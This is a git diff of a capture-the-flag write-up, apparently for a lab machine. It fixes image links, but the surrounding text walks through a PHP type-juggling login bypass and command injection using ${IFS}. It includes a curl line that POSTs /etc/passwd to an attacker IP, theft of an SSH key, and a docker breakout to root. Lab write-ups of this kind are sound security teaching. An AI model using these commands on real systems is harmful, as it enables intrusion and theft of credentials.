@@ -52,13 +52,13 @@ So there's a `.git` repository which we can download first.
 
 Port 80 hosts a corporate website:
 
-![](<../../../.gitbook/assets/image%20(3954).png>)
+![](../../../.gitbook/assets/develop-10.png)
 
 If we click 'Get in touch', we are redirected to `develop.site/getintouch.php`. We can first add that to our `/etc/hosts` file and then enumerate further.
 
 The page reveals a simple Contact Form:
 
-![](<../../../.gitbook/assets/image%20(3148).png>)
+![](../../../.gitbook/assets/develop-7.png)
 
 Nothing much there. I ran a `gobuster` scan on the website and also downloaded the `.git` repository. While the `gobuster` scan ran, I enumerated the logs of the repository. Here's the interesting output:
 
@@ -158,23 +158,23 @@ Lastly, we have `login.php` form, which uses the username concatenated with the 
 
 The `.git` repository seems to be for the service running on port 8080:
 
-![](<../../../.gitbook/assets/image%20(3937).png>)
+![](../../../.gitbook/assets/develop-8.png)
 
 We can login with `lu191:240610708`, abusing the type juggling here and view the dashboard:
 
-![](<../../../.gitbook/assets/image%20(1190).png>)
+![](../../../.gitbook/assets/develop-3.png)
 
 The Resources tab of the dashboard shows potential for RCE:
 
-![](<../../../.gitbook/assets/image%20(312).png>)
+![](../../../.gitbook/assets/develop-6.png)
 
 So we know that this is probably still vulnerable to RCE, and it tells us when we are blocked.
 
-![](<../../../.gitbook/assets/image%20(308).png>)
+![](../../../.gitbook/assets/develop-5.png)
 
 I tested different commands, and found that `curl` isn't blocked:
 
-![](<../../../.gitbook/assets/image%20(1175).png>)
+![](../../../.gitbook/assets/develop-1.png)
 
 Commands like `bash` and `sh` are blocked, and so are 'space' characters, so it will be difficult to get a reverse shell through `curl`. However, we can use this to read the files on the system by sending POST requests to our listening port 80.
 
@@ -184,15 +184,15 @@ To overcome the space character block, we can use `${IFS}`. Using this, we can s
 127.0.0.1;curl${IFS}-X${IFS}POST${IFS}-F${IFS}"file=@/etc/passwd"${IFS}http://192.168.45.191
 ```
 
-![](<../../../.gitbook/assets/image%20(294).png>)
+![](../../../.gitbook/assets/develop-4.png)
 
 Using this method, I found that the user was `franz`. We can then attempt to read their private SSH key:
 
-![](<../../../.gitbook/assets/image%20(3964).png>)
+![](../../../.gitbook/assets/develop-11.png)
 
 We can then `ssh` in:
 
-![](<../../../.gitbook/assets/image%20(1180).png>)
+![](../../../.gitbook/assets/develop-2.png)
 
 ## Privilege Escalation
 
@@ -212,4 +212,4 @@ Just run this command from Hacktricks:
 docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host d4c3cafb11d5 chroot /host/ bash
 ```
 
-![](<../../../.gitbook/assets/image%20(3941).png>)
+![](../../../.gitbook/assets/develop-9.png)
